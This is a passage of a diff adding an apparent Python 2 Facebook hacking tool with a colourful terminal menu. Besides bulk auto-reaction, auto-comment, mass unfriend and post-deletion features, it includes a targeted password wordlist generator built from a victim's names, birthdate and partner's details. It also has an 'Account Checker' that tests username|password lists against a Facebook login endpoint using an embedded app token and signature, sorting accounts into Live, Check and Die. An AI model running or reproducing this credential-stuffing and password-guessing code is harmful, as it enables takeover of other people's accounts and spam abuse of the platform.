+    print '\xe2\x95\x91-> \x1b[1;37;40m5. \x1b[1;97mSad'
+    print '\xe2\x95\x91-> \x1b[1;37;40m6. \x1b[1;97mAngry'
+    print '\xe2\x95\x91-> \x1b[1;31;40m0. Back'
+    print '\x1b[1;37;40m\xe2\x95\x91'
+    reactg_pilih()
+
+
+def reactg_pilih():
+    global tipe
+    aksi = raw_input('\xe2\x95\x9a\xe2\x95\x90\x1b[1;91m\xe2\x96\xb6\x1b[1;97m ')
+    if aksi == '':
+        print "\x1b[1;91m[!] Can't empty"
+        reactg_pilih()
+    elif aksi == '1':
+        tipe = 'LIKE'
+        reactg()
+    elif aksi == '2':
+        tipe = 'LOVE'
+        reactg()
+    elif aksi == '3':
+        tipe = 'WOW'
+        reactg()
+    elif aksi == '4':
+        tipe = 'HAHA'
+        reactg()
+    elif aksi == '5':
+        tipe = 'SAD'
+        reactg()
+    elif aksi == '6':
+        tipe = 'ANGRY'
+        reactg()
+    elif aksi == '0':
+        menu_bot()
+    else:
+        print '\x1b[1;91m[\xe2\x9c\x96] \x1b[1;97m' + aksi + ' \x1b[1;91mnot found'
+        reactg_pilih()
+
+
+def reactg():
+    os.system('clear')
+    try:
+        toket = open('login.txt', 'r').read()
+    except IOError:
+        print '\x1b[1;91m[!] Token not found'
+        os.system('rm -rf login.txt')
+        time.sleep(1)
+        login()
+    else:
+        os.system('clear')
+        print logo
+        print 52 * '\x1b[1;97m\xe2\x95\x90'
+        ide = raw_input('\x1b[1;91m[+] \x1b[1;92mID Group \x1b[1;91m:\x1b[1;97m ')
+        limit = raw_input('\x1b[1;91m[!] \x1b[1;92mLimit \x1b[1;91m:\x1b[1;97m ')
+        ah = requests.get('https://graph.facebook.com/group/?id=' + ide + '&access_token=' + toket)
+        asw = json.loads(ah.text)
+        print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mName group \x1b[1;91m:\x1b[1;97m ' + asw['name']
+        try:
+            oh = requests.get('https://graph.facebook.com/v3.0/' + ide + '?fields=feed.limit(' + limit + ')&access_token=' + toket)
+            ah = json.loads(oh.text)
+            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mPlease wait \x1b[1;97m...')
+            print 52 * '\x1b[1;97m\xe2\x95\x90'
+            for a in ah['feed']['data']:
+                y = a['id']
+                reaksigrup.append(y)
+                requests.post('https://graph.facebook.com/' + y + '/reactions?type=' + tipe + '&access_token=' + toket)
+                print '\x1b[1;92m[\x1b[1;97m' + y[:10].replace('\n', ' ') + '... \x1b[1;92m] \x1b[1;97m' + tipe
+
+            print
+            print '\r\x1b[1;91m[+]\x1b[1;97m Finish \x1b[1;96m' + str(len(reaksigrup))
+            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
+            menu_bot()
+        except KeyError:
+            print '\x1b[1;91m[!] ID not found'
+            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
+            menu_bot()
+
+
+def bot_komen():
+    os.system('clear')
+    try:
+        toket = open('login.txt', 'r').read()
+    except IOError:
+        print '\x1b[1;91m[!] Token not found'
+        os.system('rm -rf login.txt')
+        time.sleep(1)
+        login()
+    else:
+        os.system('clear')
+        print logo
+        print 52 * '\x1b[1;97m\xe2\x95\x90'
+        print "\x1b[1;91m[!] \x1b[1;92mUse \x1b[1;97m'<>' \x1b[1;92m for newline"
+        ide = raw_input('\x1b[1;91m[+] \x1b[1;92mID Target \x1b[1;91m:\x1b[1;97m ')
+        km = raw_input('\x1b[1;91m[+] \x1b[1;92mComments  \x1b[1;91m:\x1b[1;97m ')
+        limit = raw_input('\x1b[1;91m[!] \x1b[1;92mLimit \x1b[1;91m:\x1b[1;97m ')
+        km = km.replace('<>', '\n')
+        try:
+            p = requests.get('https://graph.facebook.com/' + ide + '?fields=feed.limit(' + limit + ')&access_token=' + toket)
+            a = json.loads(p.text)
+            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mPlease wait \x1b[1;97m...')
+            print 52 * '\x1b[1;97m\xe2\x95\x90'
+            for s in a['feed']['data']:
+                f = s['id']
+                komen.append(f)
+                requests.post('https://graph.facebook.com/' + f + '/comments?message=' + km + '&access_token=' + toket)
+                print '\x1b[1;92m[\x1b[1;97m' + km[:10].replace('\n', ' ') + '... \x1b[1;92m]'
+
+            print
+            print '\r\x1b[1;91m[+]\x1b[1;97m Finish \x1b[1;96m' + str(len(komen))
+            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
+            menu_bot()
+        except KeyError:
+            print '\x1b[1;91m[!] ID not found'
+            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
+            menu_bot()
+
+
+def grup_komen():
+    os.system('clear')
+    try:
+        toket = open('login.txt', 'r').read()
+    except IOError:
+        print '\x1b[1;91m[!] Token not found'
+        os.system('rm -rf login.txt')
+        time.sleep(1)
+        login()
+    else:
+        os.system('clear')
+        print logo
+        print 52 * '\x1b[1;97m\xe2\x95\x90'
+        print "\x1b[1;91m[!] \x1b[1;92mGunakan \x1b[1;97m'<>' \x1b[1;92mUntuk Baris Baru"
+        ide = raw_input('\x1b[1;91m[+] \x1b[1;92mID Group  \x1b[1;91m:\x1b[1;97m ')
+        km = raw_input('\x1b[1;91m[+] \x1b[1;92mComments \x1b[1;91m:\x1b[1;97m ')
+        limit = raw_input('\x1b[1;91m[!] \x1b[1;92mLimit \x1b[1;91m:\x1b[1;97m ')
+        km = km.replace('<>', '\n')
+        try:
+            ah = requests.get('https://graph.facebook.com/group/?id=' + ide + '&access_token=' + toket)
+            asw = json.loads(ah.text)
+            print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mName grup \x1b[1;91m:\x1b[1;97m ' + asw['name']
+            p = requests.get('https://graph.facebook.com/v3.0/' + ide + '?fields=feed.limit(' + limit + ')&access_token=' + toket)
+            a = json.loads(p.text)
+            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mPlease wait \x1b[1;97m...')
+            print 52 * '\x1b[1;97m\xe2\x95\x90'
+            for s in a['feed']['data']:
+                f = s['id']
+                komengrup.append(f)
+                requests.post('https://graph.facebook.com/' + f + '/comments?message=' + km + '&access_token=' + toket)
+                print '\x1b[1;92m[\x1b[1;97m' + km[:10].replace('\n', ' ') + '... \x1b[1;92m]'
+
+            print
+            print '\r\x1b[1;91m[+]\x1b[1;97m Finish \x1b[1;96m' + str(len(komengrup))
+            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
+            menu_bot()
+        except KeyError:
+            print '\x1b[1;91m[!] ID not found'
+            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
+            menu_bot()
+
+
+def deletepost():
+    os.system('clear')
+    try:
+        toket = open('login.txt', 'r').read()
+        nam = requests.get('https://graph.facebook.com/me?access_token=' + toket)
+        lol = json.loads(nam.text)
+        nama = lol['name']
+    except IOError:
+        print '\x1b[1;91m[!] Token not found'
+        os.system('rm -rf login.txt')
+        time.sleep(1)
+        login()
+
+    os.system('clear')
+    print logo
+    print 52 * '\x1b[1;97m\xe2\x95\x90'
+    print '\x1b[1;91m[+] \x1b[1;92mFrom \x1b[1;91m: \x1b[1;97m%s' % nama
+    jalan('\x1b[1;91m[+] \x1b[1;92mStarting remove status\x1b[1;97m ...')
+    print 52 * '\x1b[1;97m\xe2\x95\x90'
+    asu = requests.get('https://graph.facebook.com/me/feed?access_token=' + toket)
+    asus = json.loads(asu.text)
+    for p in asus['data']:
+        id = p['id']
+        piro = 0
+        url = requests.get('https://graph.facebook.com/' + id + '?method=delete&access_token=' + toket)
+        ok = json.loads(url.text)
+        try:
+            error = ok['error']['message']
+            print '\x1b[1;91m[\x1b[1;97m' + id[:10].replace('\n', ' ') + '...' + '\x1b[1;91m] \x1b[1;95mFailed'
+        except TypeError:
+            print '\x1b[1;92m[\x1b[1;97m' + id[:10].replace('\n', ' ') + '...' + '\x1b[1;92m] \x1b[1;96mRemoved'
+            piro += 1
+        except requests.exceptions.ConnectionError:
+            print '\x1b[1;91m[!] Connection Error'
+            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
+            menu_bot()
+
+    print '\n\x1b[1;91m[+] \x1b[1;97mFinish'
+    raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
+    menu_bot()
+
+
+def accept():
+    os.system('clear')
+    try:
+        toket = open('login.txt', 'r').read()
+    except IOError:
+        print '\x1b[1;91m[!] Token not found'
+        os.system('rm -rf login.txt')
+        time.sleep(1)
+        login()
+
+    os.system('clear')
+    print logo
+    print 52 * '\x1b[1;97m\xe2\x95\x90'
+    limit = raw_input('\x1b[1;91m[!] \x1b[1;92mLimit \x1b[1;91m:\x1b[1;97m ')
+    r = requests.get('https://graph.facebook.com/me/friendrequests?limit=' + limit + '&access_token=' + toket)
+    friends = json.loads(r.text)
+    if '[]' in str(friends['data']):
+        print '\x1b[1;91m[!] No friends request'
+        raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
+        menu_bot()
+    jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mPlease wait \x1b[1;97m...')
+    print 52 * '\x1b[1;97m\xe2\x95\x90'
+    for i in friends['data']:
+        gas = requests.post('https://graph.facebook.com/me/friends/' + i['from']['id'] + '?access_token=' + toket)
+        a = json.loads(gas.text)
+        if 'error' in str(a):
+            print '\x1b[1;91m[+] \x1b[1;92mName  \x1b[1;91m:\x1b[1;97m ' + i['from']['name']
+            print '\x1b[1;91m[+] \x1b[1;92mID    \x1b[1;91m:\x1b[1;97m ' + i['from']['id'] + '\x1b[1;91m Failed'
+            print 52 * '\x1b[1;97m\xe2\x95\x90'
+        else:
+            print '\x1b[1;91m[+] \x1b[1;92mName  \x1b[1;91m:\x1b[1;97m ' + i['from']['name']
+            print '\x1b[1;91m[+] \x1b[1;92mID    \x1b[1;91m:\x1b[1;97m ' + i['from']['id'] + '\x1b[1;92m Berhasil'
+            print 52 * '\x1b[1;97m\xe2\x95\x90'
+
+    print '\n\x1b[1;91m[+] \x1b[1;97mFinish'
+    raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
+    menu_bot()
+
+
+def unfriend():
+    os.system('clear')
+    try:
+        toket = open('login.txt', 'r').read()
+    except IOError:
+        print '\x1b[1;91m[!] Token not found'
+        os.system('rm -rf login.txt')
+        time.sleep(1)
+        login()
+    else:
+        os.system('clear')
+        print logo
+        print 52 * '\x1b[1;97m\xe2\x95\x90'
+        jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mPlease wait \x1b[1;97m...')
+        print 52 * '\x1b[1;97m\xe2\x95\x90'
+        print '\x1b[1;97mStop \x1b[1;91mCTRL+C'
+        print
+        try:
+            pek = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
+            cok = json.loads(pek.text)
+            for i in cok['data']:
+                nama = i['name']
+                id = i['id']
+                requests.delete('https://graph.facebook.com/me/friends?uid=' + id + '&access_token=' + toket)
+                print '\x1b[1;97m[\x1b[1;92mRemove\x1b[1;97m] ' + nama + ' => ' + id
+
+        except IndexError:
+            pass
+        except KeyboardInterrupt:
+            print '\x1b[1;91m[!] Stopped'
+            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
+            menu_bot()
+
+    print '\n\x1b[1;91m[+] \x1b[1;97mFinish'
+    raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
+    menu_bot()
+
+
+def lain():
+    os.system('clear')
+    try:
+        toket = open('login.txt', 'r').read()
+    except IOError:
+        print '\x1b[1;91m[!] Token not found'
+        os.system('rm -rf login.txt')
+        time.sleep(1)
+        login()
+
+    os.system('clear')
+    print logo
+    print 52 * '\x1b[1;97m\xe2\x95\x90'
+    print '\xe2\x95\x91-> \x1b[1;37;40m1. Write Status'
+    print '\xe2\x95\x91-> \x1b[1;37;40m2. Make Wordlist'
+    print '\xe2\x95\x91-> \x1b[1;37;40m3. Account Checker'
+    print '\xe2\x95\x91-> \x1b[1;37;40m4. List Group'
+    print '\xe2\x95\x91-> \x1b[1;37;40m5. Profile Guard'
+    print '\xe2\x95\x91-> \x1b[1;31;40m0. Back'
+    print '\x1b[1;37;40m\xe2\x95\x91'
+    pilih_lain()
+
+
+def pilih_lain():
+    other = raw_input('\xe2\x95\x9a\xe2\x95\x90\x1b[1;91m\xe2\x96\xb6\x1b[1;97m ')
+    if other == '':
+        print "\x1b[1;91m[!] Can't empty"
+        pilih_lain()
+    elif other == '1':
+        status()
+    elif other == '2':
+        wordlist()
+    elif other == '3':
+        check_akun()
+    elif other == '4':
+        grupsaya()
+    elif other == '5':
+        guard()
+    elif other == '0':
+        menu()
+    else:
+        print '\x1b[1;91m[\xe2\x9c\x96] \x1b[1;97m' + other + ' \x1b[1;91mnot found'
+        pilih_lain()
+
+
+def status():
+    os.system('clear')
+    try:
+        toket = open('login.txt', 'r').read()
+    except IOError:
+        print '\x1b[1;91m[!] Token not found'
+        os.system('rm -rf login.txt')
+        time.sleep(1)
+        login()
+
+    os.system('clear')
+    print logo
+    print 52 * '\x1b[1;97m\xe2\x95\x90'
+    msg = raw_input('\x1b[1;91m[+] \x1b[1;92mWrite status \x1b[1;91m:\x1b[1;97m ')
+    if msg == '':
+        print "\x1b[1;91m[!] Can't empty"
+        raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
+        lain()
+    else:
+        res = requests.get('https://graph.facebook.com/me/feed?method=POST&message=' + msg + '&access_token=' + toket)
+        op = json.loads(res.text)
+        jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mPlease wait \x1b[1;97m...')
+        print 52 * '\x1b[1;97m\xe2\x95\x90'
+        print '\x1b[1;91m[+] \x1b[1;92mStatus ID\x1b[1;91m : \x1b[1;97m' + op['id']
+        raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
+        lain()
+
+
+def wordlist():
+    os.system('clear')
+    try:
+        toket = open('login.txt', 'r').read()
+    except IOError:
+        print '\x1b[1;91m[!] Token not found'
+        os.system('rm -rf login.txt')
+        time.sleep(1)
+        login()
+    else:
+        try:
+            os.system('clear')
+            print logo
+            print 52 * '\x1b[1;97m\xe2\x95\x90'
+            print '\x1b[1;91m[?] \x1b[1;92mIsi data lengkap target dibawah'
+            print 52 * '\x1b[1;97m\xe2\x95\x90'
+            a = raw_input('\x1b[1;91m[+] \x1b[1;92mName Depan \x1b[1;97m: ')
+            file = open(a + '.txt', 'w')
+            b = raw_input('\x1b[1;91m[+] \x1b[1;92mName Tengah \x1b[1;97m: ')
+            c = raw_input('\x1b[1;91m[+] \x1b[1;92mName Belakang \x1b[1;97m: ')
+            d = raw_input('\x1b[1;91m[+] \x1b[1;92mName Panggilan \x1b[1;97m: ')
+            e = raw_input('\x1b[1;91m[+] \x1b[1;92mTanggal Lahir >\x1b[1;96mex: |DDMMYY| \x1b[1;97m: ')
+            f = e[0:2]
+            g = e[2:4]
+            h = e[4:]
+            print 52 * '\x1b[1;97m\xe2\x95\x90'
+            print '\x1b[1;91m[?] \x1b[1;93mKalo Jomblo SKIP aja :v'
+            i = raw_input('\x1b[1;91m[+] \x1b[1;92mName Pacar \x1b[1;97m: ')
+            j = raw_input('\x1b[1;91m[+] \x1b[1;92mName Panggilan Pacar \x1b[1;97m: ')
+            k = raw_input('\x1b[1;91m[+] \x1b[1;92mTanggal Lahir Pacar >\x1b[1;96mex: |DDMMYY| \x1b[1;97m: ')
+            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mPlease wait \x1b[1;97m...')
+            l = k[0:2]
+            m = k[2:4]
+            n = k[4:]
+            file.write('%s%s\n%s%s%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s%s\n%s%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s%s\n%s%s%s\n%s%s%s\n%s%s%s\n%s%s%s\n%s%s%s\n%s%s%s\n%s%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s' % (a, c, a, b, b, a, b, c, c, a, c, b, a, a, b, b, c, c, a, d, b, d, c, d, d, d, d, a, d, b, d, c, a, e, a, f, a, g, a, h, b, e, b, f, b, g, b, h, c, e, c, f, c, g, c, h, d, e, d, f, d, g, d, h, e, a, f, a, g, a, h, a, e, b, f, b, g, b, h, b, e, c, f, c, g, c, h, c, e, d, f, d, g, d, h, d, d, d, a, f, g, a, g, h, f, g, f, h, f, f, g, f, g, h, g, g, h, f, h, g, h, h, h, g, f, a, g, h, b, f, g, b, g, h, c, f, g, c, g, h, d, f, g, d, g, h, a, i, a, j, a, k, i, e, i, j, i, k, b, i, b, j, b, k, c, i, c, j, c, k, e, k, j, a, j, b, j, c, j, d, j, j, k, a, k, b, k, c, k, d, k, k, i, l, i, m, i, n, j, l, j, m, j, n, j, k))
+            wg = 0
+            while wg < 100:
+                wg = wg + 1
+                file.write(a + str(wg) + '\n')
+
+            en = 0
+            while en < 100:
+                en = en + 1
+                file.write(i + str(en) + '\n')
+
+            word = 0
+            while word < 100:
+                word = word + 1
+                file.write(d + str(word) + '\n')
+
+            gen = 0
+            while gen < 100:
+                gen = gen + 1
+                file.write(j + str(gen) + '\n')
+
+            file.close()
+            time.sleep(1.5)
+            print '\n\x1b[1;91m[+] \x1b[1;97mSaved \x1b[1;91m: \x1b[1;97m %s.txt' % a
+            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
+            lain()
+        except IOError as e:
+            print '\x1b[1;91m[!] Make file failed'
+            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
+            lain()
+
+
+def check_akun():
+    os.system('clear')
+    try:
+        toket = open('login.txt', 'r').read()
+    except IOError:
+        print '\x1b[1;91m[!] Token not found'
+        os.system('rm -rf login.txt')
+        time.sleep(1)
+        login()
+    else:
+        os.system('clear')
+        print logo
+        print 52 * '\x1b[1;97m\xe2\x95\x90'
+        print '\x1b[1;91m[?] \x1b[1;92mIsi File\x1b[1;91m : \x1b[1;97musername|password'
+        print 52 * '\x1b[1;97m\xe2\x95\x90'
+        live = []
+        cek = []
+        die = []
+        try:
+            file = raw_input('\x1b[1;91m[+] \x1b[1;92mFile \x1b[1;91m:\x1b[1;97m ')
+            list = open(file, 'r').readlines()
+        except IOError:
+            print '\x1b[1;91m[!] File not found'
+            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
+            lain()
+
+    pemisah = raw_input('\x1b[1;91m[+] \x1b[1;92mSeparator \x1b[1;91m:\x1b[1;97m ')
+    jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mPlease wait \x1b[1;97m...')
+    print 52 * '\x1b[1;97m\xe2\x95\x90'
+    for meki in list:
+        username, password = meki.strip().split(str(pemisah))
+        url = 'https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + username + '&locale=en_US&password=' + password + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6'
+        data = requests.get(url)
+        mpsh = json.loads(data.text)
+        if 'access_token' in mpsh:
+            live.append(password)
+            print '\x1b[1;97m[\x1b[1;92mLive\x1b[1;97m]  \x1b[1;97m' + username + ' | ' + password
+        elif 'www.facebook.com' in mpsh['error_msg']:
+            cek.append(password)
+            print '\x1b[1;97m[\x1b[1;93mCheck\x1b[1;97m] \x1b[1;97m' + username + ' | ' + password
+        else:
+            die.append(password)
+            print '\x1b[1;97m[\x1b[1;91mDie\x1b[1;97m]  \x1b[1;97m' + username + ' | ' + password
+
+    print '\n\x1b[1;91m[+] \x1b[1;97mTotal\x1b[1;91m : \x1b[1;97mLive=\x1b[1;92m' + str(len(live)) + ' \x1b[1;97mCheck=\x1b[1;93m' + str(len(cek)) + ' \x1b[1;97mDie=\x1b[1;91m' + str(len(die))
+    raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
+    lain()
+
+
+def grupsaya():
+    os.system('clear')
+    try:
+        toket = open('login.txt', 'r').read()
+    except IOError:
+        print '\x1b[1;91m[!] Token not found'
+        os.system('rm -rf login.txt')
+        time.sleep(1)
+        login()
+    else:
+        os.system('clear')
+        print logo
+        print 52 * '\x1b[1;97m\xe2\x95\x90'
+        jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mPlease wait \x1b[1;97m...')
+        print 52 * '\x1b[1;97m\xe2\x95\x90'
+        try:
+            uh = requests.get('https://graph.facebook.com/me/groups?access_token=' + toket)
+            gud = json.loads(uh.text)
+            for p in gud['data']:
+                nama = p['name']
+                id = p['id']
+                f = open('grupid.txt', 'w')
+                listgrup.append(id)
+                f.write(id + '\n')
+                print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mName  \x1b[1;91m:\x1b[1;97m ' + str(nama)
+                print '\x1b[1;91m[+] \x1b[1;92mID    \x1b[1;91m:\x1b[1;97m ' + str(id)
+                print 52 * '\x1b[1;97m='
+
+            print '\n\r\x1b[1;91m[+] \x1b[1;97mTotal Group \x1b[1;96m%s' % len(listgrup)
+            print '\x1b[1;91m[+] \x1b[1;97mSaved \x1b[1;91m: \x1b[1;97mgrupid.txt'
+            f.close()
+            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
+            lain()
+        except (KeyboardInterrupt, EOFError):
+            print '\x1b[1;91m[!] Stopped'
+            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
+            lain()
+        except KeyError:
+            os.remove('grupid.txt')
+            print '\x1b[1;91m[!] Group not found'
+            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
+            lain()
+        except requests.exceptions.ConnectionError:
+            print '\x1b[1;91m[\xe2\x9c\x96] No connection'
+            keluar()
+        except IOError:
+            print '\x1b[1;91m[!] Error when creating file'
+            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
+            lain()
+
+
+def guard():
+    global toket
+    os.system('clear')
+    try:
+        toket = open('login.txt', 'r').read()
+    except IOError:
+        print '\x1b[1;91m[!] Token not found'
+        os.system('rm -rf login.txt')
+        time.sleep(1)
+        login()
+
+    os.system('clear')
+    print logo
+    print 52 * '\x1b[1;97m\xe2\x95\x90'
+    print '\xe2\x95\x91-> \x1b[1;37;40m1. Enable'
+    print '\xe2\x95\x91-> \x1b[1;37;40m2. Disable'
+    print '\xe2\x95\x91-> \x1b[1;31;40m0. Back'
+    print '\x1b[1;37;40m\xe2\x95\x91'
+    g = raw_input('\xe2\x95\x9a\xe2\x95\x90\x1b[1;91m\xe2\x96\xb6\x1b[1;97m ')
+    if g == '1':
+        aktif = 'true'
+        gaz(toket, aktif)
+    elif g == '2':
+        non = 'false'
+        gaz(toket, non)
+    elif g == '0':
+        lain()
+    elif g == '':
+        keluar()
+    else:
+        keluar()
+
+
+def get_userid(toket):
+    url = 'https://graph.facebook.com/me?access_token=%s' % toket
+    res = requests.get(url)
+    uid = json.loads(res.text)
+    return uid['id']
+
+
+def gaz(toket, enable=True):
+    id = get_userid(toket)
+    data = 'variables={"0":{"is_shielded": %s,"session_id":"9b78191c-84fd-4ab6-b0aa-19b39f04a6bc","actor_id":"%s","client_mutation_id":"b0316dd6-3fd6-4beb-aed4-bb29c5dc64b0"}}&method=post&doc_id=1477043292367183&query_name=IsShieldedSetMutation&strip_defaults=true&strip_nulls=true&locale=en_US&client_country_code=US&fb_api_req_friendly_name=IsShieldedSetMutation&fb_api_caller_class=IsShieldedSetMutation' % (enable, str(id))
+    headers = {'Content-Type': 'application/x-www-form-urlencoded', 'Authorization': 'OAuth %s' % toket}
+    url = 'https://graph.facebook.com/graphql'
+    res = requests.post(url, data=data, headers=headers)
+    print res.text
+    if '"is_shielded":true' in res.text:
+        os.system('clear')
+        print logo
+        print 52 * '\x1b[1;97m\xe2\x95\x90'
+        print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mActivated'
+        raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
+        lain()
+    elif '"is_shielded":false' in res.text:
+        os.system('clear')
+        print logo
+        print 52 * '\x1b[1;97m\xe2\x95\x90'
+        print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;91mDeactivated'
+        raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
+        lain()
+    else:
+        print '\x1b[1;91m[!] Error'
+        keluar()
+
+
+if __name__ == '__main__':
+    login()
